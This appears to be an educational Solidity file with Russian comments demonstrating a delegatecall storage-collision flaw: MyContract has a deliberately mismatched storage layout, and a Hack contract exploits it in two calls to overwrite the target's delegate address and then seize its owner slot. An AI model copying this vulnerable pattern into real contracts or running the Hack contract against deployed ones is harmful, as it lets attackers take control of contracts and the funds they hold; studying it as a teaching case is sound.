// SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;


contract AnotherContract {
    uint public at;
    address public sender;
    uint public amount;

    event Received(address sender, uint value);

    function getData(uint timestamp) external payable {
        at = timestamp;
        sender = msg.sender;
        amount = msg.value;
        emit Received(msg.sender, msg.value);

    }
}

contract MyContract {
    // WARNING
    // при вызове ф-ции getData, данные могут быть переписаны т к идет сравнение по слотам, если неправильная растановка переменных, будет переписан owner, т к в  
    // getData sender перезаписывается и он нахоходиться в 1 слоте(at - 0 слот, sender -1 слот)
    address public otherContract;
    address public owner;
    uint public at;
    address public sender;
    uint public amount;


    constructor(address _otherConstract){
        otherContract = _otherConstract;
    }

    function delCallGetData(uint timestamp) external payable {
        // В event Received будет записан адресс того кто вызвал котракт(не контракта), ф-ция getData контракта AnotherContract выполняется в контексте этого контракта
        // поэтому msg.sender равен инициализатору тр-ции

        // При вызове getData ф-ции в контракте MyContract, будут установлены переменные address и uint т.к. ф-ция выполняется в контексте этого контракта, но переменные 
        // в обоих контрактах должны идти одинаково 
        (bool success,) = otherContract.delegatecall(
            abi.encodeWithSelector(AnotherContract.getData.selector, timestamp)
        );
        require(success, "Can't send funds");

    }
}

contract Hack {
    address public otherContract;
    address public owner;

    MyContract public toHack;

    constructor(address _to){
        toHack = MyContract(_to);

    }

    function attack() external {

        toHack.delCallGetData(uint(uint160(address(this))));
        // перехватываем адрес и перезаписываем otherContract поле в контракте MyContract
        toHack.delCallGetData(0);
        //Вызываем еще раз т к адрес otherContract переписан и указывает на хакерский контракт вызовется ф-ция getData снизу
        //и перезапише owner поле в контракте MyContract
    }

    function getData(uint _timestamp) external {
        owner = msg.sender;
    }
}